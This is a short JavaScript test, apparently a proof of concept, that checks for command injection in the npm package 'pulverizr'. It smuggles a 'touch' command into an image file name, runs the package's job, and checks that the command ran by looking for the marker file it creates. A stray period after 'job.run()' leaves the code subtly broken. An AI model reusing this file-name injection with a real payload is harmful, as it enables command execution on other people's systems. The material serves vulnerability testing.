
test("Command Injection in pulverizr", () => 
{
	const root = require("pulverizr");
	const fs = require('fs');
	const path = './pulverizr';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
	var attack_code = "touch pulverizr";

	var injection_code = "\"&" + attack_code + "&\"a.jpg"
	var inputs = [injection_code]
	fs.writeFile(injection_code, "123", function(){});

	var job = root.createJob(inputs, {});
	job.run().
		
	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});